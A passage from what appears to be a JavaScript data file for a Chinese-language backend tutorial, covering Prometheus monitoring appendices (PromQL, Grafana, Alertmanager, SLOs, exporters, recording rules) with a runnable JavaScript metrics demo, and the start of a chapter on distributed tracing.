    histogram_quantile(0.99, sum(rate(http_duration_seconds_bucket[5m])) by (le))

**CPU 使用率**：

    100 - (avg by(instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100)

**内存使用率**：

    (1 - node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes) * 100

**Top 5 最慢接口**：

    topk(5, histogram_quantile(0.99, sum(rate(http_duration_seconds_bucket[5m])) by (le, handler)))

### B.5 聚合运算

    sum by (service) (http_requests_total)     # 按 service 求和
    avg by (method) (http_duration_seconds)     # 按 method 求平均
    max by (instance) (node_load1)              # 按 instance 取最大
    count by (status) (http_requests_total)     # 按 status 计数
    stddev by (endpoint) (http_duration_seconds) # 标准差

### B.6 子查询

子查询允许在区间向量上做即时查询：

    rate(http_requests_total[5m])[30m:1m]

含义：过去 30 分钟内，每 1 分钟算一次 rate(http_requests_total[5m])。用于"变化率的变化率"分析。

---

## 附录 C：Grafana 可视化

Grafana 是最流行的监控可视化工具，和 Prometheus 是黄金搭档。

### C.1 Dashboard 设计原则

1. **从上到下，从全局到细节**：第一行放总览（QPS、错误率、延迟），下面放细节（各服务、各接口）。
2. **一行一个主题**：如"流量"行、"错误"行、"延迟"行、"资源"行。
3. **颜色语义**：绿色正常、黄色警告、红色错误。不要乱用颜色。
4. **阈值线**：在图表上画 SLO 阈值线，一眼看出是否达标。
5. **变量化**：用变量（$service、$instance）让 Dashboard 可复用。

### C.2 常用 Panel 类型

| 类型 | 适用场景 | 示例 |
|------|----------|------|
| Time Series | 时间趋势曲线 | QPS 随时间变化 |
| Stat | 单个关键数值 | 当前在线用户数 |
| Gauge | 仪表盘，有阈值 | CPU 使用率 |
| Bar Gauge | 多维度数值对比 | 各服务延迟对比 |
| Table | 表格数据 | 各接口错误率排行 |
| Heatmap | 分布热力图 | 延迟分布 |
| Node Graph | 拓扑图 | 服务依赖关系 |

### C.3 告警面板

Grafana 8+ 支持内置告警。可在 Dashboard 上直接配置告警规则：

1. 选 Panel，点 Alert，创建告警。
2. 设条件（如 A 即时查询，B 阈值）。
3. 设通知渠道（Slack、邮件、Webhook）。
4. 设评估频率（如每 1 分钟评估一次）。

### C.4 Dashboard 模板变量

用变量让一个 Dashboard 服务多个环境/服务：

    # 变量 $service 查询所有服务名
    query: label_values(http_requests_total, service)
    
    # Panel 查询用变量
    sum(rate(http_requests_total{service="$service"}[5m]))

用户选 $service=order-service，所有 Panel 自动过滤到该服务。

---

## 附录 D：告警系统设计

### D.1 Alertmanager 架构

Alertmanager 接收 Prometheus 的告警，做去重、分组、路由、静默、通知。

工作流程：

1. Prometheus 评估告警规则，触发后发到 Alertmanager。
2. Alertmanager 去重（同一告警多实例只报一次）。
3. 分组（同 service 的告警合在一起）。
4. 路由（按标签路由到不同通知渠道）。
5. 静默（维护窗口不告警）。
6. 抑制（某告警触发后抑制相关告警）。
7. 发送通知（邮件、Slack、PagerDuty、Webhook）。

### D.2 告警规则编写

    groups:
      - name: service-alerts
        rules:
          - alert: HighErrorRate
            expr: |
              sum(rate(http_requests_total{status=~"5.."}[5m])) by (service)
              / sum(rate(http_requests_total[5m])) by (service)
              > 0.05
            for: 5m
            labels:
              severity: critical
            annotations:
              summary: "{{ $labels.service }} 错误率过高"
              description: "{{ $labels.service }} 5xx 错误率 {{ $value | humanizePercentage }}，超过 5% 已持续 5 分钟"

关键字段：

- expr：PromQL 表达式，满足条件触发告警。
- for：持续多久才告警（防止抖动）。
- labels：告警标签（severity、team 等）。
- annotations：告警描述（用模板变量补充信息）。

### D.3 告警分级

| 级别 | 含义 | 响应时间 | 通知方式 |
|------|------|----------|----------|
| P0/Critical | 核心服务不可用 | 立即 | 电话+短信+IM |
| P1/Warning | 核心服务降级 | 5 分钟 | 短信+IM |
| P2/Info | 非核心异常 | 30 分钟 | IM |
| P3/Notice | 容量预警 | 1 小时 | 邮件 |

### D.4 告警降噪策略

1. **分组**：同一 service 的告警合并成一条。

    route:
      group_by: ['service', 'alertname']
      group_wait: 30s       # 首次等待 30 秒再发（收集同组）
      group_interval: 5m    # 同组后续告警间隔 5 分钟
      repeat_interval: 4h   # 重复告警间隔 4 小时

2. **抑制**：DB 挂了抑制所有应用告警（因为根因是 DB）。

    inhibit_rules:
      - source_match: { alertname: "DatabaseDown" }
        target_match_re: { alertname: "ServiceError" }
        equal: ['service']

3. **静默**：维护窗口静默。

    # CLI 创建静默
    amtool silence add alertname=DeploymentComplete --duration=2h

4. **for 持续时间**：防止瞬时抖动。如 for: 5m 表示连续 5 分钟满足条件才告警。

---

## 附录 E：SLI/SLO/SLA 实践

### E.1 SLI 设计

SLI 是"信号"，选择什么作为 SLI 很关键。

**好的 SLI**：

- 请求成功率：2xx+3xx / 总请求
- 延迟：P99 < 500ms 的比例
- 可用性：成功请求数 / 总请求数

**坏的 SLI**：

- CPU 使用率（不直接反映用户体验）
- 内存使用率（同上）
- 日志条数（无意义）

SLI 应该从用户视角出发——用户关心的是"能不能用、快不快"。

### E.2 SLO 设定

SLO 是"目标"，要既挑战又可实现。

**设定原则**：

1. 基于历史数据：先看当前实际可用性，SLO 设在略高于现状。
2. 按用户期望：用户能接受 99.9% 还是 99.99%？
3. 按成本：每多一个 9 成本翻倍，ROI 是否划算？
4. 按业务：核心链路 SLO 高（99.99%），边缘功能 SLO 低（99.5%）。

**SLO 示例**：

| 服务 | SLO | 错误预算 | 月允许宕机 |
|------|-----|----------|------------|
| 下单 | 99.99% | 0.01% | 4.3 分钟 |
| 支付 | 99.99% | 0.01% | 4.3 分钟 |
| 搜索 | 99.95% | 0.05% | 21.6 分钟 |
| 评论 | 99.9% | 0.1% | 43.2 分钟 |
| 推荐 | 99.5% | 0.5% | 3.6 小时 |

### E.3 错误预算管理

错误预算是"SLO 允许的不可用时间"。

    错误预算 = (1 - SLO) × 时间周期

如 30 天 SLO=99.9%：
    错误预算 = (1 - 0.999) × 43200 分钟 = 43.2 分钟

**错误预算的使用**：

- 预算未用完：可以激进发布、做实验。
- 预算用完：冻结发布，只修 bug，保稳定性。
- 预算超支：需要提升架构，否则 SLO 永远不达标。

这种"预算驱动"的方式让开发和运维有共同语言——开发想快发布，运维想稳，错误预算是客观的平衡点。

### E.4 SLA 与赔偿

SLA 是对外合同，违反要赔偿。

| 可用性 | 月宕机 | 赔偿（示例） |
|--------|--------|--------------|
| < 99.9% | > 43 分钟 | 服务费 10% |
| < 99.0% | > 7.2 小时 | 服务费 30% |
| < 95.0% | > 36 小时 | 服务费 100% |

SLA 通常比 SLO 低一档——SLO 99.95%，SLA 99.9%。留 buffer 避免赔偿。

---

## 附录 F：监控反模式

### F.1 监控一切，但不告警

采集了几百个指标，但没配告警。出了问题才发现"哦数据里有异常但没人看"。

正确做法：指标采集和告警配套。每个关键指标配告警阈值。

### F.2 告警太多（告警疲劳）

每天 500 条告警，团队麻木了，真正的 P0 被淹没。

正确做法：告警分级 + 降噪 + 只告"需要人介入"的。能自动恢复的不告。

### F.3 只监控基础设施，不监控业务

CPU、内存、磁盘监控齐全，但不知道"下单成功率是多少"。

正确做法：加业务指标（订单量、支付成功率、转化率），业务指标比基础设施指标更早发现问题。

### F.4 阈值一成不变

上线时设的阈值（如 CPU > 80% 告警），大促时流量翻 10 倍，告警风暴。

正确做法：阈值随业务周期调整。大促前调高阈值或临时静默。

### F.5 Dashboard 太多太乱

建了 200 个 Dashboard，找不到想看的。

正确做法：Dashboard 分层——总览（1 个）、服务级（每服务 1 个）、细节（按需）。用变量复用。

### F.6 监控系统自身没监控

Prometheus 挂了都不知道，监控系统成了盲区。

正确做法：监控 Prometheus 自身（prometheus_up、tsdb_head_series、scrape_duration_seconds）。用另一个 Prometheus 交叉监控（meta-monitoring）。

---

## 附录 G：多语言监控实践

### G.1 Java（Micrometer + Prometheus）

Micrometer 是 Java 监控的"SLF4J"——统一 API，适配多种后端。

    // Maven: micrometer-registry-prometheus
    
    @Autowired
    MeterRegistry registry;
    
    // Counter
    registry.counter("orders.created", "type", "vip").increment();
    
    // Gauge
    registry.gauge("queue.size", queue, Queue::size);
    
    // Timer（相当于 Histogram）
    Timer timer = registry.timer("order.duration");
    timer.record(() -> createOrder());

Spring Boot Actuator 自动暴露 /actuator/prometheus 端点。

### G.2 Go（Prometheus Client）

    import "github.com/prometheus/client_golang/prometheus"
    
    var (
        requests = prometheus.NewCounterVec(
            prometheus.CounterOpts{Name: "http_requests_total"},
            []string{"method", "status"},
        )
        duration = prometheus.NewHistogramVec(
            prometheus.HistogramOpts{
                Name:    "http_duration_seconds",
                Buckets: []float64{0.01, 0.05, 0.1, 0.5, 1, 5},
            },
            []string{"method"},
        )
    )
    
    func init() {
        prometheus.MustRegister(requests, duration)
    }
    
    // HTTP handler
    http.Handle("/metrics", promhttp.Handler())

### G.3 Python（prometheus-client）

    from prometheus_client import Counter, Histogram, start_http_server
    
    requests = Counter('http_requests_total', 'Total requests', ['method', 'status'])
    duration = Histogram('http_duration_seconds', 'Request duration', ['method'])
    
    start_http_server(9090)  # 暴露 /metrics 在 9090 端口
    
    @app.route('/api/orders')
    def orders():
        with duration.labels(method='GET').time():
            requests.labels(method='GET', status='200').inc()
            return jsonify(...)

### G.4 Node.js（prom-client）

    const client = require('prom-client');
    
    // 默认指标（CPU、内存、事件循环等）
    const collectDefaultMetrics = client.collectDefaultMetrics;
    collectDefaultMetrics();
    
    // 自定义指标
    const requests = new client.Counter({
      name: 'http_requests_total',
      help: 'Total requests',
      labelNames: ['method', 'status'],
    });
    
    const duration = new client.Histogram({
      name: 'http_duration_seconds',
      help: 'Request duration',
      labelNames: ['method'],
      buckets: [0.01, 0.05, 0.1, 0.5, 1, 5],
    });
    
    // 暴露 /metrics
    app.get('/metrics', (req, res) => {
      res.set('Content-Type', client.register.contentType);
      res.end(client.register.metrics());
    });

---

## 附录 H：监控指标命名规范

好的指标名让人一看就懂。Prometheus 社区有命名约定：

### H.1 命名规则

1. 小写下划线：http_requests_total（不用 httpRequestTotal）。
2. 单位后缀：_seconds（时间）、_bytes（大小）、_total（累计计数）。
3. 基础名 + 后缀：http_requests_total、http_requests_failed_total。
4. 避免缩写：duration 不写 dur，memory 不写 mem。

### H.2 常见后缀

| 后缀 | 含义 | 示例 |
|------|------|------|
| _total | Counter 累计值 | http_requests_total |
| _seconds | 时间（秒） | http_duration_seconds |
| _bytes | 大小（字节） | memory_usage_bytes |
| _ratio | 比率（0-1） | cache_hit_ratio |
| _count | 计数 | error_count |
| _sum | 求和 | request_size_bytes_sum |

### H.3 标签命名

1. 小写下划线：instance_id（不 instanceId）。
2. 语义清晰：method、status、handler、service。
3. 避免保留名：__name__、__address__ 是 Prometheus 内部用的。

### H.4 反例

    # 坏命名
    req_count          # 单位不明确，是累计还是瞬时？
    latency            # 单位是秒还是毫秒？
    error              # 是计数还是布尔？
    
    # 好命名
    http_requests_total          # 累计请求数
    http_duration_seconds        # 延迟（秒）
    http_errors_total            # 累计错误数

---

## 附录 I：监控系统部署与运维

### I.1 Prometheus 部署模式

**单机模式**：一个 Prometheus 采集所有目标。适合小规模（< 100 目标）。

**联邦模式**：多个 Prometheus 分片采集，中心 Prometheus 聚合。适合中规模。

**Thanos/Cortex 模式**：Prometheus 采集本地数据，Thanos Sidecar 上传到对象存储（S3）。全局查询通过 Thanos Query。适合大规模、长期存储。

### I.2 容量规划

| 规模 | 目标数 | 时间序列数 | 推荐 |
|------|--------|------------|------|
| 小型 | < 100 | < 10 万 | 单机 Prometheus |
| 中型 | 100-1000 | 10-100 万 | 联邦模式 |
| 大型 | > 1000 | > 100 万 | Thanos + 对象存储 |

每百万时间序列约需 4GB 内存。监控 prometheus_tsdb_head_series 增长。

### I.3 长期存储

Prometheus 本地存储默认 15 天。长期存储方案：

1. Thanos：Sidecar 上传到 S3，全局查询。
2. Cortex：多租户、水平扩展的 Prometheus 后端。
3. M3DB：Uber 开源的时序数据库。
4. VictoriaMetrics：高性能、高压缩的时序数据库。

选型：中小用 VictoriaMetrics（简单高效），大型用 Thanos（生态好）。

### I.4 高可用

Prometheus 本身的高可用：

1. 部署 2 个 Prometheus 实例，采集相同目标。
2. 前面加负载均衡或用 Alertmanager 去重。
3. 两个实例都能独立告警，Alertmanager 去重后只通知一次。

Thanos 模式更优雅：Prometheus 本地短存，Thanos 做全局长存和查询。

---

## 附录 J：监控面试深度问答

### J.1 "Prometheus 为什么用 Pull？"

答：Pull 有四个优势：

1. 主动控制采集频率，防止应用打爆监控。
2. 应用不需知道监控 server，解耦。
3. 拉取失败即信号（up=0），Push 模式不知道应用是否挂。
4. 简单 HTTP，无需 SDK。

劣势：短命任务（Cron Job）不好 pull，需 Pushgateway 中转。

### J.2 "histogram_quantile 怎么工作？"

答：Histogram 把值分桶（bucket），每个桶用 le 标签表示上限。histogram_quantile 在桶间线性插值算分位数。如 P99：

1. 算出每个桶的累计计数。
2. 找到 99% 分位点落在哪个桶。
3. 在该桶内线性插值估算具体值。

注意：桶设计很重要。如果 P99 落在最后一个桶（+Inf），无法精确计算。

### J.3 "标签高基数什么问题？"

答：每个唯一标签组合产生一个时间序列。高基数标签（如 user_id）导致时间序列爆炸，TSDB 内存暴涨、查询变慢。

解决：不用高基数标签。如果需要按用户维度分析，用日志或追踪系统，不用 Prometheus。

### J.4 "SLO 怎么定？"

答：三步：

1. 选 SLI（如请求成功率）。
2. 看历史数据，确定当前实际水平。
3. SLO 设在略高于现状（留提升空间），但不能超工程能力。

如当前可用性 99.8%，SLO 设 99.9%。不要一上来设 99.99%——达不到会打击团队信心。

### J.5 "告警怎么避免疲劳？"

答：四招：

1. 分级：P0 电话，P3 邮件。
2. 降噪：分组、抑制、静默。
3. for 持续时间：防抖动。
4. 只告需要人的：能自愈的不告。

目标是：每条告警都"值得人看"。

---

## 附录 K：监控术语速查表

| 术语 | 含义 |
|------|------|
| Metric | 指标，可量化的测量值 |
| Time Series | 时间序列，指标随时间的变化 |
| Label | 标签，指标的维度 |
| Cardinality | 基数，标签值的组合数 |
| Counter | 计数器，只增不减 |
| Gauge | 仪表盘，可增可减 |
| Histogram | 直方图，分桶统计分布 |
| Summary | 摘要，服务端算分位数 |
| Scrape | 采集，Prometheus 拉取目标 |
| Target | 采集目标 |
| Recording Rule | 预计算规则 |
| Alerting Rule | 告警规则 |
| SLI | 服务水平指标 |
| SLO | 服务水平目标 |
| SLA | 服务水平协议 |
| Error Budget | 错误预算 |
| RED | Rate/Error/Duration 方法 |
| USE | Utilization/Saturation/Errors 方法 |
| Four Golden Signals | 延迟/流量/错误/饱和度 |
| TSDB | 时序数据库 |

掌握这些术语，监控相关的文档和实践就能顺畅理解。监控是可观测性的"第二支柱"，它让系统从"感觉有问题"变成"数据说话"——每一条告警、每一个 Dashboard 都有据可依。

---

## 附录 L：Exporters 生态

Prometheus 的强大很大程度来自丰富的 Exporter 生态——把各种系统的指标暴露为 Prometheus 格式。

### L.1 常用 Exporters

| Exporter | 监控对象 | 关键指标 |
|----------|----------|----------|
| node_exporter | Linux 主机 | CPU、内存、磁盘、网络 |
| mysql_exporter | MySQL | 连接数、QPS、慢查询、复制延迟 |
| redis_exporter | Redis | 内存、命中率、键数、连接数 |
| kafka_exporter | Kafka | 消息速率、积压、分区 |
| nginx_exporter | Nginx | 连接数、请求率、状态码分布 |
| blackbox_exporter | 黑盒探测 | HTTP/TCP/ICMP 探测结果 |
| jmx_exporter | JVM | GC、堆内存、线程数 |

### L.2 node_exporter 详解

node_exporter 是最常用的 Exporter，监控 Linux 主机：

    # CPU 使用率
    100 - avg(rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100
    
    # 内存使用率
    (1 - node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes) * 100
    
    # 磁盘使用率
    (1 - node_filesystem_avail_bytes{mountpoint="/"} / node_filesystem_size_bytes{mountpoint="/"}) * 100
    
    # 网络入流量
    rate(node_network_receive_bytes_total{device="eth0"}[5m]) * 8  # 转 bit/s
    
    # 磁盘 IO
    rate(node_disk_reads_completed_total[5m])

### L.3 blackbox_exporter

blackbox_exporter 做"黑盒探测"——从外部探测服务的可用性：

1. HTTP 探测：检查 URL 是否返回 200。
2. TCP 探测：检查端口是否通。
3. ICMP 探测：Ping 检查主机是否可达。
4. DNS 探测：检查 DNS 解析是否正确。

    - job_name: blackbox-http
      metrics_path: /probe
      params:
        module: [http_2xx]
      static_configs:
        - targets:
          - https://api.example.com/health
      relabel_configs:
        - source_labels: [__address__]
          target_label: __param_target
        - source_labels: [__param_target]
          target_label: instance
        - target_label: __address__
          replacement: blackbox:9115

探测结果包含 probe_success（0/1）、probe_duration_seconds（探测耗时），适合做"外部可用性监控"。

---

## 附录 M：Recording Rules（预计算规则）

复杂 PromQL 查询每次执行很慢。Recording Rules 预计算常用查询，存为新指标，查询时直接读预计算结果。

### M.1 配置示例

    groups:
      - name: precomputed
        rules:
          # 预计算 QPS
          - record: job:http_requests:rate5m
            expr: sum by (job) (rate(http_requests_total[5m]))
          
          # 预计算错误率
          - record: job:http_errors:ratio_rate5m
            expr: |
              sum by (job) (rate(http_requests_total{status=~"5.."}[5m]))
              / sum by (job) (rate(http_requests_total[5m]))
          
          # 预计算 P99
          - record: job:http_duration:p99_5m
            expr: |
              histogram_quantile(0.99, sum by (job, le) (rate(http_duration_seconds_bucket[5m])))

### M.2 命名约定

预计算指标命名：level:metric:operations

- level：聚合级别（如 job、service、instance）。
- metric：原始指标名。
- operations：操作（如 rate5m、p99_5m）。

如 job:http_requests:rate5m 表示"按 job 聚合的 5 分钟请求速率"。

### M.3 优势

1. 查询快：预计算结果已存，查询时直接读。
2. Dashboard 加载快：不用每次算复杂表达式。
3. 告警快：告警规则用预计算指标，评估更快。
4. 降低 Prometheus 压力：预计算在后台定期执行，不影响查询。

---

## 附录 N：监控文化与实践

### N.1 监控驱动开发

好的监控不是"运维的事"，而是开发也要参与的：

1. 开发写指标埋点（因为最了解业务逻辑）。
2. 开发参与 Dashboard 设计（知道什么指标有意义）。
3. 开发参与告警响应（最了解代码能最快定位）。
4. 开发做 SLO 评估（知道技术债和风险）。

Google SRE 的原则："开发要对服务的全生命周期负责"，包括监控。

### N.2 监控成熟度模型

| 级别 | 特征 |
|------|------|
| L0 无监控 | 出了问题才知道 |
| L1 基础监控 | CPU、内存告警，但没业务指标 |
| L2 业务监控 | 有 QPS、错误率、延迟，有 Dashboard |
| L3 主动监控 | 告警精准、降噪好，SLO 驱动 |
| L4 智能监控 | AI 异常检测、自动根因分析 |
| L5 自愈 | 监控触发自动扩缩容、自动回滚 |

大多数公司在 L2-L3。向 L4-L5 演进需要数据积累和工程投入。

### N.3 监控 Checklist

1. 四个黄金信号是否都有监控（延迟、流量、错误、饱和度）？
2. 业务指标是否监控（订单量、支付成功率）？
3. Dashboard 是否分层（总览→服务→细节）？
4. 告警是否分级（P0-P3）？
5. 告警是否降噪（分组、抑制、静默）？
6. SLO 是否定义并跟踪？
7. 错误预算是否管理？
8. 监控系统自身是否被监控？
9. 是否有容量规划数据？
10. 是否定期演练（断服务、看告警是否触发）？

### N.4 从监控到可观测性

监控（Monitoring）告诉你"系统是否正常"。

可观测性（Observability）告诉你"系统为什么不正常"。

可观测性 = 监控 + 日志 + 追踪 + 剖析。

监控发现问题，日志和追踪定位问题，剖析找到代码级根因。三者结合，才能实现"快速排障"的目标。

现代可观测性平台（如 Datadog、Grafana Stack、ELK+Jaeger+Prometheus）正在融合这些能力，提供统一的可观测性体验。

---

## 附录 O：监控最佳实践总结

1. 先监控用户关心的（业务指标），再监控技术指标。
2. 四个黄金信号是底线：延迟、流量、错误、饱和度。
3. 告警要精准——每条告警都值得人看。
4. Dashboard 要分层——总览到细节，不要平铺。
5. SLO 驱动——用量化目标管理稳定性。
6. 错误预算是开发和运维的共同语言。
7. 监控系统自身也要被监控。
8. 指标命名要规范——单位、后缀、小写下划线。
9. 避免标签高基数——不用 user_id 做 label。
10. 预计算常用查询——Recording Rules 提升性能。
11. 多语言统一——用 OpenTelemetry 标准化采集。
12. 定期演练——验证告警是否真的触发。

监控不是"做完就结束"的项目，而是"持续优化"的过程。随着系统演进，监控也要同步演进——新服务上线要加监控，旧指标失效要清理，告警阈值要调优。好的监控系统是团队的"第二双眼睛"，7x24 小时盯着系统，在用户感知之前发现问题。

记住：没有监控的系统就像闭眼开车——你以为在前进，但不知道前面有什么。而过度监控的系统就像警报不停的工厂——噪音太大，反而听不到真正的问题。好的监控是"精准且克制"的——只在需要的时候，给需要的人，发需要的信息。

掌握监控的核心：知道系统是否健康（四个黄金信号），知道哪里出了问题（告警+Dashboard），知道怎么定位（日志+追踪），知道目标是什么（SLO）。这四点做好了，监控体系就基本成型了。

---

## 附录 P：监控与告警面试速查

面试中常被问到的监控问题，用一句话回答：

- Q：可观测性三支柱？ A：Metrics（指标）、Logs（日志）、Traces（追踪），互补不替代。
- Q：Counter 和 Gauge 区别？ A：Counter 只增不减（如请求总数），Gauge 可增可减（如队列长度）。
- Q：为什么用 Pull？ A：主动控制、解耦、拉取失败即信号、简单。
- Q：高基数标签？ A：不用 user_id 等无限值做 label，否则时间序列爆炸。
- Q：P99 怎么算？ A：histogram_quantile(0.99, sum(rate(bucket[5m])) by (le))，桶间插值。
- Q：SLO vs SLA？ A：SLO 是内部目标，SLA 是对外合同（违反要赔偿）。
- Q：告警疲劳？ A：分级 + 降噪（分组、抑制、静默）+ 只告需要人的。
- Q：错误预算？ A：(1-SLO) × 周期。用完冻结发布，未用完可激进迭代。`,
    code: `// ============================================================
// 监控与 Prometheus —— 可运行示例
// 实现 Metrics 采集：Counter/Gauge/Histogram + Registry + Prom 格式输出
// ============================================================

// ---------- 1. Counter 计数器（只增不减） ----------
class Counter {
  constructor(name, help, labels = []) {
    this.name = name;
    this.help = help;
    this.labelNames = labels;
    this.values = new Map();  // key: label 字符串, value: 数值
  }
  _key(labels) {
    return this.labelNames.map(n => labels[n] || '').join('|');
  }
  inc(labels = {}, by = 1) {
    const k = this._key(labels);
    this.values.set(k, (this.values.get(k) || 0) + by);
  }
  get(labels = {}) { return this.values.get(this._key(labels)) || 0; }
  format() {
    const lines = [];
    for (const [k, v] of this.values) {
      const labelParts = this.labelNames.map((n, i) => n + '="' + k.split('|')[i] + '"');
      const labelStr = labelParts.length ? '{' + labelParts.join(',') + '}' : '';
      lines.push(this.name + labelStr + ' ' + v);
    }
    return lines.join('\\n');
  }
}

// ---------- 2. Gauge 瞬时值（可增可减） ----------
class Gauge {
  constructor(name, help, labels = []) {
    this.name = name; this.help = help;
    this.labelNames = labels; this.values = new Map();
  }
  _key(labels) { return this.labelNames.map(n => labels[n] || '').join('|'); }
  set(labels, val) { this.values.set(this._key(labels), val); }
  inc(labels = {}, by = 1) {
    const k = this._key(labels);
    this.values.set(k, (this.values.get(k) || 0) + by);
  }
  dec(labels = {}, by = 1) { this.inc(labels, -by); }
  get(labels = {}) { return this.values.get(this._key(labels)) || 0; }
  format() {
    const lines = [];
    for (const [k, v] of this.values) {
      const labelParts = this.labelNames.map((n, i) => n + '="' + k.split('|')[i] + '"');
      const labelStr = labelParts.length ? '{' + labelParts.join(',') + '}' : '';
      lines.push(this.name + labelStr + ' ' + v);
    }
    return lines.join('\\n');
  }
}

// ---------- 3. Histogram 直方图（分桶 + 分位数计算） ----------
class Histogram {
  constructor(name, help, buckets = [0.005, 0.01, 0.05, 0.1, 0.5, 1, 5]) {
    this.name = name; this.help = help;
    this.buckets = [...buckets].sort((a, b) => a - b);
    this.bucketCounts = new Array(this.buckets.length + 1).fill(0);  // 最后一个 +Inf
    this.sum = 0; this.count = 0;
    this.observations = [];  // 保留原始值用于精确分位数
  }
  observe(value) {
    this.sum += value; this.count++;
    this.observations.push(value);
    for (let i = 0; i < this.buckets.length; i++) {
      if (value <= this.buckets[i]) { this.bucketCounts[i]++; }
    }
    this.bucketCounts[this.buckets.length]++;  // +Inf
  }
  // 线性插值计算分位数（类似 Prometheus histogram_quantile）
  quantile(q) {
    if (this.count === 0) return 0;
    const target = q * this.count;
    let cumulative = 0;
    for (let i = 0; i < this.buckets.length; i++) {
      if (cumulative + this.bucketCounts[i] >= target) {
        const bucketStart = i === 0 ? 0 : this.buckets[i - 1];
        const bucketEnd = this.buckets[i];
        const bucketCount = this.bucketCounts[i];
        if (bucketCount === 0) return bucketEnd;
        // 线性插值
        return bucketStart + (target - cumulative) / bucketCount * (bucketEnd - bucketStart);
      }
      cumulative += this.bucketCounts[i];
    }
    return this.buckets[this.buckets.length - 1];  // 落在 +Inf 桶
  }
  format() {
    const lines = [];
    let cum = 0;
    for (let i = 0; i < this.buckets.length; i++) {
      cum += this.bucketCounts[i];
      lines.push(this.name + '_bucket{le="' + this.buckets[i] + '"} ' + cum);
    }
    lines.push(this.name + '_bucket{le="+Inf"} ' + this.count);
    lines.push(this.name + '_sum ' + this.sum);
    lines.push(this.name + '_count ' + this.count);
    return lines.join('\\n');
  }
}

// ---------- 4. Metrics Registry ----------
class Registry {
  constructor() { this.metrics = new Map(); }
  register(metric) { this.metrics.set(metric.name, metric); return metric; }
  get(name) { return this.metrics.get(name); }
  // 输出 Prometheus 文本格式
  expose() {
    const out = [];
    for (const m of this.metrics.values()) {
      out.push('# HELP ' + m.name + ' ' + m.help);
      out.push('# TYPE ' + m.name + ' ' + (m instanceof Counter ? 'counter' : m instanceof Gauge ? 'gauge' : 'histogram'));
      out.push(m.format());
    }
    return out.join('\\n');
  }
}

// ---------- 5. 模拟一次服务运行 ----------
const reg = new Registry();
const reqTotal = reg.register(new Counter('http_requests_total', 'Total HTTP requests', ['method', 'status']));
const errTotal = reg.register(new Counter('http_errors_total', 'Total errors', ['type']));
const activeConn = reg.register(new Gauge('active_connections', 'Current connections'));
const latency = reg.register(new Histogram('http_request_duration_seconds', 'Request latency'));

console.log('===== 模拟服务运行：处理 200 个请求 =====');
for (let i = 0; i < 200; i++) {
  // 模拟请求方法分布
  const method = Math.random() > 0.5 ? 'GET' : 'POST';
  // 模拟 95% 成功，5% 错误
  const isError = Math.random() < 0.05;
  const status = isError ? (Math.random() > 0.5 ? '500' : '503') : '200';
  reqTotal.inc({ method, status });
  if (isError) {
    errTotal.inc({ type: status === '500' ? 'server_error' : 'unavailable' });
  }
  // 连接数波动
  activeConn.set({}, Math.floor(40 + Math.random() * 20));
  // 模拟延迟分布（大部分快，少数慢）
  const dur = Math.random() < 0.9 ? Math.random() * 0.1 : 0.1 + Math.random() * 2;
  latency.observe(dur);
}

// ---------- 6. 输出关键指标 ----------
console.log('\\n--- 关键指标汇总 ---');
console.log('总请求数:', reqTotal.get({ method: 'GET', status: '200' }) + reqTotal.get({ method: 'POST', status: '200' }) +
  reqTotal.get({ method: 'GET', status: '500' }) + reqTotal.get({ method: 'POST', status: '500' }) +
  reqTotal.get({ method: 'GET', status: '503' }) + reqTotal.get({ method: 'POST', status: '503' }));
console.log('当前连接数:', activeConn.get({}));
console.log('P50 延迟:', latency.quantile(0.5).toFixed(4) + 's');
console.log('P90 延迟:', latency.quantile(0.9).toFixed(4) + 's');
console.log('P99 延迟:', latency.quantile(0.99).toFixed(4) + 's');

// 错误率计算（模拟 PromQL: errors / total）
const totalReq = [...reqTotal.values.values()].reduce((a, b) => a + b, 0);
const totalErr = [...errTotal.values.values()].reduce((a, b) => a + b, 0);
console.log('错误率:', (totalErr / totalReq * 100).toFixed(2) + '%');

// ---------- 7. 输出 Prometheus 文本格式 ----------
console.log('\\n--- Prometheus /metrics 输出（部分）---');
console.log('# HELP http_requests_total Total HTTP requests');
console.log('# TYPE http_requests_total counter');
console.log(reqTotal.format());
console.log('');
console.log('# HELP active_connections Current connections');
console.log('# TYPE active_connections gauge');
console.log(activeConn.format());
console.log('');
console.log('# HELP http_request_duration_seconds Request latency');
console.log('# TYPE http_request_duration_seconds histogram');
console.log(latency.format());

// ---------- 8. 模拟告警判断 ----------
console.log('\\n--- 告警判断（错误率 > 5% 持续 5 分钟）---');
const errorRate = totalErr / totalReq;
if (errorRate > 0.05) {
  console.log('  [P1 告警] 错误率 ' + (errorRate * 100).toFixed(2) + '% 超过 5% 阈值');
} else {
  console.log('  [正常] 错误率 ' + (errorRate * 100).toFixed(2) + '% 在阈值内');
}

// P99 告警
console.log('\\n--- 告警判断（P99 延迟 > 1s）---');
const p99 = latency.quantile(0.99);
if (p99 > 1) {
  console.log('  [P1 告警] P99 延迟 ' + p99.toFixed(3) + 's 超过 1s 阈值');
} else {
  console.log('  [正常] P99 延迟 ' + p99.toFixed(3) + 's 在阈值内');
}

console.log('\\n===== 演示结束 =====');
`,
  },

  // =========================================================
  // 第三章：分布式链路追踪
  // =========================================================
  {
    id: "backend-tracing",
    group: "分布式与工程化",
    icon: "🔍",
    title: "分布式链路追踪",
    content: `## 分布式链路追踪

**分布式链路追踪（Distributed Tracing）** 解决的是微服务架构下"一次请求经过了哪些服务、每一步耗时多少、在哪里出了错"的问题。在单体应用里，一个请求的处理都在一个进程内，看堆栈和日志就能定位；但在微服务里，一次下单可能经过网关、用户、商品、订单、库存、支付 6 个服务，分散在 6 台机器的 6 份日志里，没有链路追踪，定位问题就像在没有地图的迷宫里找路。

本章从链路追踪核心概念出发，讲解数据模型、传播机制、OpenTelemetry、采样策略、Span 类型、追踪场景、主流系统对比，以及与日志和监控的关联。

### 一、为什么需要链路追踪

#### 1.1 微服务的"调用链迷宫"

考虑一次电商下单请求：

\`\`\`
用户 APP → API 网关 → 用户服务(鉴权) → 商品服务(查商品)
                            ↓
         库存服务(扣库存) ← 订单服务(创建订单) → 支付服务(支付)
\`\`\`

这 6 个服务分别部署在不同机器。如果用户反馈"下单慢"，怎么定位？

- 没有 tracing：登录 6 台机器，靠时间戳和订单号在 6 份日志里人肉串联，可能要几小时。
